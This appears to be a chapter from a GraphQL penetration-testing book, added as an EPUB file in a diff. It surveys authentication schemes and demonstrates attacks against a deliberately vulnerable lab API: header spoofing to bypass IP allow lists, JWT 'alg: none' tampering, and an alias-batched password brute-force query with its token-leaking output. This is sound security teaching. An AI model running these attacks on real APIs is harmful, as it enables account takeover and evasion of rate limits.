@@ -1,0 +1,570 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
+<head>
+<title>Chapter 7: Authentication and Authorization Bypasses</title>
+<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
+<meta content="urn:uuid:c77cce49-9403-4fd1-99ba-33d115574b0c" name="Adept.expected.resource"/>
+</head>
+<body epub:type="bodymatter chapter">
+<section>
+<header>
+<h1 class="chapter">
+<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_163" title="163"/><a class="XrefDestination" id="7"/><span class="XrefDestination" id="xref-502840c07-001"/>7</span><br/>
+<span class="ChapterTitle"><a class="XrefDestination" id="AuthenticationandAuthorizationBypasses"/><span class="XrefDestination" id="xref-502840c07-002"/>Authentication and Authorization Bypasses</span></h1>
+</header>
+<figure class="opener">
+<img alt="" src="image_fi/book_art/chapterart.png"/>
+</figure>
+<p class="ChapterIntro">Out of the box, GraphQL has no authentication or authorization controls. As a result, the ecosystem has created its own or adopted those seen in traditional systems. In this chapter, we’ll cover the common GraphQL authentication and authorization implementations. Then we’ll discuss attacks that target some of their weaknesses.</p>
+<p><em>Authentication </em>is the mechanism by which a client proves their identity to a server. It answers the question: Is the user really who they say they are? Authentication attacks target a client’s identity, attempting to either steal credentials or spoof them to authenticate with a server, take certain actions on their behalf, or steal data to which they have access.</p>
+<p><em>Authorization </em>controls are responsible for granting access to data and ensuring that the actions an entity takes, whether they’re a human or a machine, match their assigned roles, groups, and permissions. Authorization attacks attempt to either bypass a security control entirely or poke holes in <span epub:type="pagebreak" id="Page_164" title="164"/>it, allowing an attacker to take actions that wouldn’t otherwise be possible. For example, they might gain unauthorized access to system data or perform privileged actions, such as setting another user’s password.</p>
+<p>Authentication and authorization controls can be challenging to implement. This is especially true when an application creates its own mechanisms from scratch instead of using the many battle-tested frameworks available for specific programming languages. Performing security testing of such controls is also a nontrivial task; security tools (such as API application scanners) struggle to identify authorization and authentication issues. One of the primary reasons is that scanners have no contextual understanding of the application’s business logic.</p>
+<p>For years, hackers have defeated both authentication and authorization defenses by taking advantage of weak passwords, default credentials, forged tokens, flawed account recovery processes, replay attacks, and poor rate-limit controls. Not only is exploiting these weaknesses possible in GraphQL implementations, but, in many cases, GraphQL’s client-empowering features actually enable hackers to optimize their attacks, as you’ll soon learn.</p>
+<h2 id="h1-502840c07-0001"><a class="XrefDestination" id="TheStateofAuthenticationandAuthorizationinGraphQL"/><span class="XrefDestination" id="xref-502840c07-003"/>The State of Authentication and Authorization in GraphQL</h2>
+<p class="BodyFirst">The GraphQL spec has left implementers to fend for themselves when it comes to authentication and authorization. This lack of a detailed standard has led developers to select and deploy their own GraphQL authentication and authorization controls from a variety of libraries, tools, and configurations, often leading to vulnerabilities and implementation gaps.</p>
+<p>In this section, we’ll sink our teeth into the ecosystem-driven authentication and authorization services, libraries, and plug-ins available for GraphQL. Broadly, these approaches follow two distinct architectural deployment models: in-band and out-of-band.</p>
+<h3 id="h2-502840c07-0001"><a class="XrefDestination" id="In-BandvsOut-of-Band"/><span class="XrefDestination" id="xref-502840c07-004"/>In-Band vs. Out-of-Band</h3>
+<p class="BodyFirst">In an<em> in-band </em>authentication and authorization architecture, developers implement client login, signup, role-based access controls, and other permission controls directly in the GraphQL API. The same GraphQL instance that provides clients with their application data also controls the logic that authenticates clients and grants them permissions to view data. In-band GraphQL architectures typically host query or mutation operations that enable clients to send credentials to the API. The API is responsible for verifying these credentials and then issuing tokens to the clients.</p>
+<p><em>Out-of-band</em> authentication and authorization architectures implement the access control and permissions logic on either a separate internal web application service or an external system. In such an architecture, the GraphQL API isn’t responsible for managing client login, signup, or even access control. Instead, it offloads authorization decisions to another component, such as an API gateway, a container sidecar, or another server on the network. This allows developers to decouple the authorization logic from the GraphQL application.</p>
+<p><span epub:type="pagebreak" id="Page_165" title="165"/>Of the two architectural styles, in-band architectures tend to be more vulnerable to authentication and authorization attacks. Their added complexity increases an API’s attack surface drastically. These APIs often duplicate permission logic for each entry point into the service, and as you’ll see later in this chapter, we, as hackers, can take advantage of even the slightest misaligned control.</p>
+<p>Thus, some contributors to the GraphQL ecosystem advocate for keeping authentication and authorization logic outside of GraphQL. The current industry best practice is to delegate authorization logic to the <em>business logic layer</em> of an application, which serves as the single source of truth for all business domain rules. It should sit between the GraphQL layer and the <em>persistence layer</em> (also known as the <em>database</em> or <em>datastore</em> layer), as shown in <a href="#figure7-1" id="figureanchor7-1">Figure 7-1</a>.</p>
+<figure>
+<img alt="" class="" src="image_fi/502840c07/f07001.png"/>
+<figcaption><p><a id="figure7-1">Figure 7-1</a>: The gateway, API, business, and persistence layers</p></figcaption>
+</figure>
+<p>By contrast, authentication for the entire GraphQL API should occur in an external or third-party <em>gateway layer</em>, which passes authenticated user contexts along to the API.</p>
+<h3 id="h2-502840c07-0002"><a class="XrefDestination" id="CommonApproaches"/><span class="XrefDestination" id="xref-502840c07-005"/>Common Approaches</h3>
+<p class="BodyFirst">There is no way to know what kinds of controls you’ll come across during your GraphQL hacking adventures. However, this section lists some of the common approaches we’ve seen in our research and testing. By understanding these techniques, you’ll be better equipped to detect them, as well as evaluate the vulnerabilities to which they may be susceptible.</p>
+<h4 id="h3-502840c07-0001"><a class="XrefDestination" id="HTTPBasicAuthentication"/><span class="XrefDestination" id="xref-502840c07-006"/>HTTP Basic Authentication</h4>
+<p class="BodyFirst">One of the most rudimentary GraphQL authentication methods is <em>HTTP basic authentication</em>. Defined in RFC 7617, this scheme involves the inclusion of a Base64-encoded username and password in the header of a client request. The header looks as follows:</p>
+<pre><code>Authorization: Basic <var>&lt;base64_encoded_credential&gt;</var></code></pre>
+<p><span epub:type="pagebreak" id="Page_166" title="166"/>The Base64-encoded username and password are joined by a colon into a single credential.</p>
+<p>Basic authentication is a simple technique that does not require cookies, session identifiers, or login pages. To detect basic authentication, we can use our browser. <a href="#figure7-2" id="figureanchor7-2">Figure 7-2</a> is an example of an automatic browser pop-up used to collect and encode credentials for basic authentication.</p>
+<figure>
+<img alt="" class="keyline" src="image_fi/502840c07/f07002.png"/>
+<figcaption><p><a id="figure7-2">Figure 7-2</a>: A browser pop-up example of basic authentication</p></figcaption>
+</figure>
+<p>One of the weaknesses of this method is the lack of confidentiality protections in place when transmitting the credentials to a GraphQL server over HTTP. Imagine a basic authentication header such as the following:</p>
+<pre><code>Authorization: Basic YWRtaW46YmxhY2toYXRncmFwaHFsCg==</code></pre>
+<p>Because the credentials are encoded using Base64 and sent on every request (by contrast, other systems might generate a temporary session token upon login), the attack window from which to steal such credentials is larger. The risk of transmitting credentials over an unencrypted channel can be mitigated through the use of TLS. However, if the credentials are stolen, an attacker can Base64-decode them fairly easily. To test this, open your terminal and run the following command:</p>
+<pre><code># <b>echo "YWRtaW46YmxhY2toYXRncmFwaHFsCg==" | base64 -d</b>
+admin:blackhatgraphql</code></pre>
+<p>Another weakness in basic authentication is the lack of any supported logout feature that would invalidate the credential. An attacker who steals basic authentication credentials has permanent access to the API until an admin changes the credentials. It’s rare to see basic authentication used in production-grade applications. You have a higher chance of stumbling upon the mechanism in testing or staging environments, as a quick-and-dirty method of protecting the application, but anything is possible!</p>
+<h4 id="h3-502840c07-0002"><span epub:type="pagebreak" id="Page_167" title="167"/><a class="XrefDestination" id="OAuth20andJSONWebToken"/><span class="XrefDestination" id="xref-502840c07-007"/>OAuth 2.0 and JSON Web Token</h4>
+<p class="BodyFirst"><em>Open Authorization (OAuth)</em> is an authorization framework that enables a third party to obtain temporary access to an HTTP service such as a GraphQL API. This access is obtained by orchestrating a grant process between the user and the API, or by allowing a third-party application to obtain access on behalf of the user.</p>
+<p>You may have encountered OAuth in the past if you’ve ever logged in to a website by clicking a button that says something like <em>Log in with Google</em>. We’ll only scratch the surface of OAuth 2.0 in this section, but if you’re interested in learning more about it, you can find information at <a class="LinkURL" href="https://datatracker.ietf.org/doc/html/rfc6749">https://datatracker.ietf.org/doc/html/rfc6749</a>.</p>
+<p>Imagine that you’re performing a penetration test against an application, such as an e-commerce app, that has a login mechanism in place to prevent unauthorized access. The OAuth protocol allows the e-commerce app (or the <em>client</em>, in OAuth terminology) to request authorization from a <em>resource owner</em> (you, the penetration tester, who needs to log in). When the authorization request is granted (also called an <em>authorization grant</em>), the e-commerce app will obtain an access token that it can use to access certain resources on a resource server. This resource server can be a GraphQL server. It will check the access token and, if it is found valid, service the request by allowing the client to perform queries to a resource (also called a <em>protected resource</em>).</p>
+<p>Applications that leverage the OAuth 2.0 framework can use <em>JSON Web Token (JWT)</em> as their token format. JWT is an open standard (defined in RFC 7519) that allows for the secure transmission of information between systems via a JSON object. Servers can verify JWT tokens through digital signatures and encryption. A JWT token comprises three distinct sections that are Base64-encoded and separated by periods (<code>.</code>), as shown in <a href="#listing7-1" id="listinganchor7-1">Listing 7-1</a>. These three parts are the header, payload, and signature.</p>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<b>.</b>eyJ0eXBlIjoiYWNjZXNzIiwiaWF0Ijo
+xNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIsImp0aSI6ImY0OThmZmQxLWU0YzctNGU
+5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE
+2NTY0NzEyMjJ9<b>.</b>NHs6JiLDONJsC9LpJzdBB8enXzIrqI0Cvqojj8SqA4s</code></pre>
+<p class="CodeListingCaption"><a id="listing7-1">Listing 7-1</a>: A sample JWT token</p>
+<p>The <em>header</em>, or the JWT token’s first section, defines two important details: the type of token and the signing algorithm. When we Base64-decode this header, we should be able see its contents:</p>
+<pre><code># <b>echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d</b>
+
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}</code></pre>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<span epub:type="pagebreak" id="Page_168" title="168"/><h2><span class="NoteHead">note</span></h2>
+<p>	To encode and decode entire JWT tokens and verify their signatures by using a graphical interface, you can use <a class="LinkURL" href="https://jwt.io">https://jwt.io</a>. Keep in mind that, in order to verify a JWT token’s signature, you must have the secret used to sign the token.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>The <code>typ</code> key is a header parameter that declares structural media type information about the JWT token. In this case, the media type is <code>JWT</code>. The full list of possible media types can be found at <a class="LinkURL" href="https://www.iana.org/assignments/media-types/media-types.xhtml">https://www.iana.org/assignments/media-types/media-types.xhtml</a>. This header parameter is considered optional but can be set so the application reading the header is aware of the object type structure.</p>
+<p>The <code>alg</code> key defines the JWT token’s signing algorithm used to ensure the token’s integrity. This key can represent different signing algorithms, such as these:</p>
+<ul class="disc">
+<li>No digital signature (<code>none</code>)</li>
+<li>HMAC with SHA-256 (<code>HS256</code>)</li>
+<li>HMAC with SHA-384 (<code>HS384</code>)</li>
+<li>RSA with SHA-256 (<code>RS256</code>)</li>
+<li>RSA with SHA-384 (<code>RS384</code>)</li>
+</ul>
+<p><em>Hash-based message authentication code (HMAC)</em> is a symmetric cryptographic authentication technique (meaning it uses a shared secret), whereas <em>Rivest-Shamir-Adleman (RSA)</em> is asymmetric (using public- and private-key pairs). The full list of signing algorithms can be found in RFC 7518.</p>
+<p>A common attack against applications using JWT involves setting the <code>alg</code> header parameter to <code>none</code>. If an application accepts unsigned JWT tokens, hackers can tamper with their JWT token to identify as another user or perform sensitive actions.</p>
+<p>The <em>payload</em> section, or the second part of the JWT, contains relevant information about the user, as well as any additional data the developers might find useful to include. In our example, the decoded payload should match this output:</p>
+<pre><code># <b>echo "eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIs</b>
+<b>Imp0aSI6ImY0OThmZmQxLWU0YzctNGU5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImlkZW50aXR5Ijoi</b>
+<b>b3BlcmF0b3IiLCJleHAiOjE2NTY0NzEyMjJ9" | base64 -d</b>
+{
+  "type": "access",
+  "iat": 1656464022,
+  "nbf": 1656464022,
+  "jti": "f498ffd1-e4c7-4e92-9e4a-bb74bfece18f",
+  "identity": "operator",
+  "exp": 1656471222
+}</code></pre>
+<p>Most JWT payloads will include a few standard elements, called <em>claims</em>, including an <code>iat</code> field, which represents the timestamp at which the JWT was initiated, and the <code>exp</code> field, which represents the expiry timestamp in Unix timestamp format. You can learn more about JWT fields by reading the RFC 7519 documentation.</p>
+<p><span epub:type="pagebreak" id="Page_169" title="169"/>The last part of the JWT is the <em>signature</em>, which ensures that the entire JWT wasn’t tampered with. Any manual change to the JWT should invalidate this signature, causing the GraphQL server to reject the token. As you’ll soon learn, vulnerabilities in a GraphQL server’s signature verification may allow an attacker to forge JWT tokens. In <span class="xref" itemid="xref_target_“Forging and Leaking JWT Credentials” on page 178">“Forging and Leaking JWT Credentials” on page 178</span>, we’ll touch on a few common JWT implementation weaknesses and how to exploit them.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	OAuth 2.0 can also be used to protect graphical GraphQL clients. You can find a project that adds OAuth protection support to GraphQL Playground at <a class="LinkURL" href="https://github.com/autom8ter/oauth-graphql-ide">https://github.com/autom8ter/oauth-graphql-ide</a>.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<h4 id="h3-502840c07-0003"><a class="XrefDestination" id="GraphQLModules"/><span class="XrefDestination" id="xref-502840c07-008"/>GraphQL Modules</h4>
+<p class="BodyFirst">When testing JavaScript-based GraphQL implementations, you may come across a utility library known as <em>GraphQL Modules</em>, built by The Guild (<a class="LinkURL" href="https://www.the-guild.dev">https://www.the-guild.dev</a>). This library separates GraphQL schemas into smaller, reusable modules that act as middleware. Developers can then use these to wrap their resolvers. <a href="#listing7-2" id="listinganchor7-2">Listing 7-2</a> is the Authentication module, which provides GraphQL clients with a standard set of login, signup, and user-lookup mutations and queries.</p>
+<pre><code>extend type Query {
+  me: User
+}
+
+type Mutation {
+   login(username: String!, password: String!): User
+   signup(username: String!, password: String!): User
+}
+
+extend type User {
+  username: String!
+}
+</code></pre>
+<p class="CodeListingCaption"><a id="listing7-2">Listing 7-2</a>: The Authentication module from the GraphQL Modules library</p>
+<p>As you can see, the module defines a query named <code>me</code> that returns a <code>User</code> object, as well as two mutations, named <code>login</code> and <code>signup</code>, that accept <code>username</code> and <code>password</code> arguments and return a <code>User</code> object.</p>
+<p>Developers could also implement custom <code>login</code> query and <code>signup</code> mutation operations in their GraphQL APIs without using an external library. In <span class="xref" itemid="xref_target_“Authentication Testing” on page 171">“Authentication Testing” on page 171</span>, we’ll teach you how to defeat in-band authentication operations like the examples mentioned here by using batched queries, introduced in <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span>, and CrackQL, installed in <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span>.</p>
+<h4 id="h3-502840c07-0004"><a class="XrefDestination" id="GraphQLShield"/><span class="XrefDestination" id="xref-502840c07-009"/>GraphQL Shield</h4>
+<p class="BodyFirst"><em>GraphQL Shield</em> is another middleware library, built by The Guild, for generating an authorization layer in GraphQL APIs. It allows developers to define <span epub:type="pagebreak" id="Page_170" title="170"/>rules that either permit or deny client access. <a href="#listing7-3" id="listinganchor7-3">Listing 7-3</a> shows queries and mutations protected by GraphQL Shield, which defines the permissions and roles required to access each query.</p>
+<pre><code>const permissions = shield({
+  Query: {
+    frontPage: not(isAuthenticated),
+    fruits: and(isAuthenticated, or(isAdmin, isEditor)),
+    customers: and(isAuthenticated, isAdmin),
+  },
+  Mutation: {
+    addFruitToBasket: isAuthenticated,
+  },
+  Fruit: isAuthenticated,
+  Customer: isAdmin,
+})</code></pre>
+<p class="CodeListingCaption"><a id="listing7-3">Listing 7-3</a>: A GraphQL Shield code example</p>
+<p>Clients wishing to use the <code>frontPage</code> query don’t have to be authenticated, as defined by the rule <code>not(isAuthenticated)</code>, whereas to use the <code>customers</code> query, they have to both be authenticated and have an admin user, as indicated by <code>and(isAuthenticated, isAdmin)</code>. The <code>and</code> operator mandates that both conditions must be true for permission to be granted.</p>
+<p>A developer community actively maintains GraphQL Shield and continuously improves it. As of this writing, the last documented vulnerability in GraphQL Shield was an authorization bypass that dates back to 2020 in versions earlier than 6.0.6.</p>
+<p>When performing a code review, look for the GraphQL Shield component called the <code>fallbackRule</code>. This rule can determine whether a request should be allowed or denied by default whenever a rule is not defined. By default, <code>fallbackRule</code> is set to <code>allow</code>. To read more about GraphQL Shield rules, refer to the official documentation at <a class="LinkURL" href="https://www.graphql-shield.com/docs/rules#logic-rules">https://www.graphql-shield.com/docs/rules#logic-rules</a>.</p>
+<h4 id="h3-502840c07-0005"><a class="XrefDestination" id="SchemaDirectives"/><span class="XrefDestination" id="xref-502840c07-010"/>Schema Directives</h4>
+<p class="BodyFirst">GraphQL deployments might use custom schema-level directives to apply both authentication and authorization controls on certain operations and fields. By decorating schema components, these custom directives can control what clients can and can’t do in the API. We can use them to enforce security at the query level, type level, field level, and so on.</p>
+<p>The graphql-directive-auth library (<a class="LinkURL" href="https://github.com/graphql-community/graphql-directive-auth">https://github.com/graphql-community/graphql-directive-auth</a>) provides one example of how developers could apply directives to solve authentication and authorization gaps in their APIs. In some implementations, the <code>@auth</code> directive accepts a <code>requires</code> argument, which takes a string value representing the role or group a user needs in order to query the field. Clients usually send these user groups or roles through a JWT payload. The directive logic analyzes these to either allow or deny access to protected elements of the schema.</p>
+<p><span epub:type="pagebreak" id="Page_171" title="171"/>Authorization directives can have various other names or arguments. <a href="#table7-1" id="tableanchor7-1">Table 7-1</a> is a list of common ones you might encounter in your introspection hunts.</p>
+<figure>
+<figcaption class="TableTitle"><p><a id="table7-1">Table 7-1</a>: Common GraphQL Authorization Directives</p></figcaption>
+<table border="1" id="table-502840c07-0001">
+<thead>
+<tr>
+<td><b>Directive name</b></td>
+<td><b>Argument name</b></td>
+<td><b>Argument type</b></td>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>@auth</code></td>
+<td><code>requires</code></td>
+<td><code>String</code></td>
+</tr>
+<tr>
+<td><code>@protect</code></td>
+<td><code>role</code></td>
+<td><code>String</code></td>
+</tr>
+<tr>
+<td><code>@hasRole</code></td>
+<td><code>role</code></td>
+<td><code>String</code></td>
+</tr>
+</tbody>
+</table>
+</figure>
+<p>Some <code>@auth</code> directives might also use an argument called <code>permissions</code>, which accepts a list of scope grants.</p>
+<h4 id="h3-502840c07-0006"><a class="XrefDestination" id="IP-BasedAllowListing"/><span class="XrefDestination" id="xref-502840c07-011"/>IP-Based Allow Listing</h4>
+<p class="BodyFirst">Some GraphQL APIs, particularly those deployed in internal systems that aren’t public facing, may choose not to authenticate individual client requests. Instead, they might opt to use an allow list of source IP addresses to authorize clients. In this technique, the server checks the client IP address included in a network request against a list of addresses or network range (such as <em>10.0.0.0/24</em>).</p>
+<p>This IP address often gets passed to the API by a public-facing network device, such as a reverse proxy or a load balancer. Applications will then attempt to discover the IP address by looking for HTTP headers set on incoming requests. A few common HTTP headers for this purpose are <code>X-Forwarded-For</code>, <code>X-Real-IP</code>, <code>X-Originating-IP</code>, and <code>X-Host</code>.</p>
+<p>Because clients can spoof these headers, reverse proxies may blindly forward misinformation to the application. For example, here is how you might pass a custom <code>X-Forwarded-For</code> header to DVGA with cURL:</p>
+<pre><code># <b>curl -X POST http://localhost:5013/graphql -d '{"query":"{ __typename }"}'</b>
+<b>-H "Content-Type: application/json" -H "X-Forwarded-For: 10.0.0.1"</b></code></pre>
+<p>If the application allows only requests to the GraphQL API that originate from the network <em>10.0.0.0/24</em>, injecting such a header at a later stage could allow an attacker to bypass the IP-based allow list and communicate with the application.</p>
+<h2 id="h1-502840c07-0002"><a class="XrefDestination" id="AuthenticationTesting"/><span class="XrefDestination" id="xref-502840c07-012"/>Authentication Testing</h2>
+<p class="BodyFirst">When you’re testing GraphQL authentication, you’ll encounter certain operations that aren’t protected by any authentication layer. For example, unauthenticated users might have access to queries, while only authenticated users might be able to perform more sensitive, state-changing actions using mutations. You might find this model in use on a blog: any client can read posts, whereas only authenticated users can write comments.</p>
+<p><span epub:type="pagebreak" id="Page_172" title="172"/>It’s important to do a thorough scan of the target GraphQL server and schema for any unprotected queries. This section will outline how you can detect and defeat certain GraphQL authentication controls.</p>
+<h3 id="h2-502840c07-0003"><a class="XrefDestination" id="DetectingtheAuthenticationLayer"/><span class="XrefDestination" id="xref-502840c07-013"/>Detecting the Authentication Layer</h3>
+<p class="BodyFirst">One of the best ways to determine whether a target GraphQL application is protected by an authentication layer is by sending it a canary query. Use either of the introspection queries from <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span> or craft your own to probe the schema for a range of operations, objects, and types. Depending on the response you receive, you may be able to detect the type of authentication used, as well as the layer at which authentication controls are implemented. In particular, keep an eye out for status codes, error messages, and differences in the responses to query variations.</p>
+<h4 id="h3-502840c07-0007"><a class="XrefDestination" id="HTTPStatusCodes"/><span class="XrefDestination" id="xref-502840c07-014"/>HTTP Status Codes</h4>
+<p class="BodyFirst">A sure way to verify that some sort of authentication layer exists on a GraphQL target is by analyzing the HTTP response you receive after sending a canary query. Most GraphQL implementations will always return a <em>200 OK</em> status code, even when the query contains typos or errors. However, if you receive a <em>403 Forbidden Error</em>, it’s possible that out-of-band authentication and authorization control, like a gateway or a WAF, has blocked your request from reaching the API in the first place.</p>
+<h4 id="h3-502840c07-0008"><a class="XrefDestination" id="ErrorMessages"/><span class="XrefDestination" id="xref-502840c07-015"/>Error Messages</h4>
+<p class="BodyFirst">Error messages can obviously reveal the presence of authentication controls, but they might also tell us exactly what type of authentication the API requires and where in the architecture these checks occur. <a href="#table7-2" id="tableanchor7-2">Table 7-2</a> shows a list of common in-band GraphQL authentication error messages and the authentication implementation known to raise the error message by default.</p>
+<figure>
+<figcaption class="TableTitle"><p><a id="table7-2">Table 7-2</a>: Common GraphQL Authentication Errors</p></figcaption>
+<table border="1" id="table-502840c07-0002">
+<thead>
+<tr>
+<td><b>Error message</b></td>
+<td><b>Possible authentication implementation</b></td>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Authentication credentials are missing. Authorization header is required and must contain a value.</code></td>
+<td>OAuth 2.0 Bearer with JSON Web Token </td>
+</tr>
+<tr>
+<td><code>Not Authorised!</code></td>
+<td>GraphQL Shield</td>
+</tr>
+<tr>
+<td><code>Not logged in</code><br/>
+<code>Auth required</code><br/>
+<code>API key is required</code></td>
+<td>GraphQL Modules</td>
+</tr>
+<tr>
+<td><code>Invalid token!</code><br/>
+<code>Invalid role!</code></td>
+<td>graphql-directive-auth</td>
+</tr>
+</tbody>
+</table>
+</figure>
+<p>Error messages can be customized and might differ from those shown here. Reference <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span> for additional information on how to abuse errors to extract valuable information from GraphQL. For example, a combination <span epub:type="pagebreak" id="Page_173" title="173"/>of a <em>200 OK</em> status code and an error message could indicate that authentication is required. Because these details may vary from one GraphQL API to another, we recommend checking all avenues.</p>
+<h4 id="h3-502840c07-0009"><a class="XrefDestination" id="Authentication-RelatedFields"/><span class="XrefDestination" id="xref-502840c07-016"/>Authentication-Related Fields</h4>
+<p class="BodyFirst">Another great way to detect an authentication layer is to use introspection queries to identify any authentication-related query or mutation operations. By design, in-band GraphQL authentication requires authentication, session management, and identity-based operations. For example, a client will most likely need to send unauthenticated mutation requests that perform login and sign-up operations to create and access their authenticated accounts. We can use the introspection query in <a href="#listing7-4" id="listinganchor7-4">Listing 7-4</a> to analyze the schema for any mutation operations related to authentication.</p>
+<pre><code>{
+  __schema {
+    mutationType {
+      name
+      kind
+      fields {
+        name
+        description
+      }
+    }
+  }
+}</code></pre>
+<p class="CodeListingCaption"><a id="listing7-4">Listing 7-4</a>: An introspection query used to identify all mutations</p>
+<p>Check whether the query returns any mutation names similar to these:</p>
+<ol class="none">
+<li><code>me</code></li>
+<li><code>login</code></li>
+<li><code>logout</code></li>
+<li><code>signup</code></li>
+<li><code>register</code></li>
+<li><code>createUser</code></li>
+<li><code>createAccount</code></li>
+</ol>
+<p>If so, you can infer that the API has an authentication layer, which means you can begin testing its resiliency against password brute-force attacks.</p>
+<h3 id="h2-502840c07-0004"><a class="XrefDestination" id="Brute-ForcingPasswordsbyUsingQueryBatching"/><span class="XrefDestination" id="xref-502840c07-017"/>Brute-Forcing Passwords by Using Query Batching</h3>
+<p class="BodyFirst">A classic authentication attack, password brute-forcing works against systems that fail to implement rate limits or other automated account-takeover prevention controls. To perform one, an attacker sends many login requests to a system in an attempt to correctly guess a password. This programmatic attack usually accepts a dictionary of possible user credentials or iterates through a sequence of characters to generate possible credential combinations.</p>
+<p><span epub:type="pagebreak" id="Page_174" title="174"/>Security controls such as WAFs are great at preventing excessive numbers of HTTP requests from a single client, and often throttle or ban the client when they detect such activity. However, in <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span>, we introduced <em>query batching</em>, which essentially allows a client to pack multiple query operations in a single HTTP request. We can take advantage of this batching feature to brute-force credentials by using several operations in only a single HTTP request, effectively evading security controls such as WAFs.</p>
+<p>There are two types of batch operations: array-based and alias-based. Tools like BatchQL leverage array-based query batching to send multiple operations in a single request. However, if you return to the GraphQL Threat Matrix screenshot shown in <span class="xref" itemid="xref_target_Figure 3-4">Figure 3-4</span> of<span class="xref" itemid="xref_target_ Chapter 3"> Chapter 3</span>, you’ll notice that few GraphQL implementations support this type of batching. By contrast, all major GraphQL implementations support alias-based query batching, as it’s defined in the GraphQL spec.</p>
+<p>Let’s use aliases to execute a password brute-force attack against DVGA’s GraphQL’s authentication layer. First, we’ll need to include multiple login operations with different credentials in a single GraphQL document. <a href="#listing7-5" id="listinganchor7-5">Listing 7-5</a> shows a GraphQL document with 10 login mutation aliases targeting the <em>admin</em> and <em>operator</em> user accounts in DVGA. You can also find the query in the book’s GitHub repository at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/password-brute-force.graphql">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/password-brute-force.graphql</a>.</p>
+<p>Each alias operation has a unique identifier, as well as a target username and a potential password. If one of the operations succeeds, the server should return the attacked user’s JWT access token (<code>accessToken</code>) in the response:</p>
+<pre><code>mutation {
+    alias1: login(username: "admin", password: "admin") {
+      accessToken
+    }
+    alias2: login(username: "admin", password: "password") {
+      accessToken
+    }
+    alias3: login(username: "admin", password: "pass") {
+      accessToken
+    }
+    alias4: login(username: "admin", password: "pass123") {
+      accessToken
+    }
+    alias5: login(username: "admin", password: "password123") {
+      accessToken
+    }
+    alias6: login(username: "operator", password: "operator") {
+      accessToken
+    }
+    alias7: login(username: "operator", password: "password") {
+      accessToken
+    }
+    alias8: login(username: "operator", password: "pass") {
+      accessToken
+    }
+<span epub:type="pagebreak" id="Page_175" title="175"/>    alias9: login(username: "operator", password: "pass123"){
+      accessToken
+    }
+    alias10: login(username: "operator", password: "password123"){
+      accessToken
+    }
+}</code></pre>
+<p class="CodeListingCaption"><a id="listing7-5">Listing 7-5</a>: A password brute-forcing example using batched queries</p>
+<p>Executing this password brute-force query against DVGA will result in the large response shown next. As you can see, most of this data consists of <code>Authentication Failure</code> errors. However, for <code>alias10</code>, we receive a valid <code>accessToken</code>, meaning we correctly brute-forced the <em>operator</em> password, which was set to <em>password123</em>.</p>
+<pre><code>{
+  "errors": [
+    {
+      "message": "Authentication Failure",
+      "locations": [
+        {
+          "line": 2,
+          "column": 5
+        }
+      ],
+      "path": [
+        "alias1"
+      ]
+    },
+<var>--snip--</var>
+    {
+      "message": "Authentication Failure",
+      "locations": [
+        {
+          "line": 26,
+          "column": 5
+        }
+      ],
+      "path": [
+        "alias9"
+      ]
+    }
+  ],
+  "data": {
+    "alias1": null,
+<var>--snip--</var>
+    "alias9": null,
+    "alias10": {
+      "accessToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzI
+iwiaWF0IjoxNjU2OTcxMDc5LCJuYmYiOjE2NTY5NzEwNzksImp0aSI6IjQ3NmEwYTYxLTk0OGUtNDZmO
+S05ZDBmLTFlMzk3MDAxMTNjYiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTY5NzgyNzl9.NJ
+ZOugXBwG-0oEcT2UtH-xeBFwqxS0_5Ag1Y7-L3EgI"
+    }</code></pre>
+<p><span epub:type="pagebreak" id="Page_176" title="176"/>Even if a security control protected the API by banning clients from making more than, say, five HTTP login requests per minute, this attack would evade such logic, because we sent only a single HTTP request while performing 10 login attempts.</p>
+<h3 id="h2-502840c07-0005"><a class="XrefDestination" id="Brute-ForcingPasswordswithCrackQL"/><span class="XrefDestination" id="xref-502840c07-018"/>Brute-Forcing Passwords with CrackQL</h3>
+<p class="BodyFirst">Manually building the large GraphQL document needed to successfully brute-force login credentials would be extremely time-consuming. In <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span>, you installed a GraphQL password brute-forcing and fuzzing tool called <em>CrackQL</em>. This tool accepts a single GraphQL query or mutation operation and automatically generates the alias payloads by using a CSV wordlist. Let’s run the same password brute-force attack but, this time, use CrackQL to automate it.</p>
+<p>Enter the CrackQL directory and then execute the brute-force attack against DVGA. The <code>-t</code> (target) argument specifies the destination GraphQL endpoint URL, the <code>-q</code> (query) argument takes a sample query (<code>login.graphql</code>), and the <code>-i</code> (input) argument defines the list of usernames and passwords to use in the attack. The <code>--verbose</code> argument allows us to view additional information such as the final payload before it is sent to DVGA.</p>
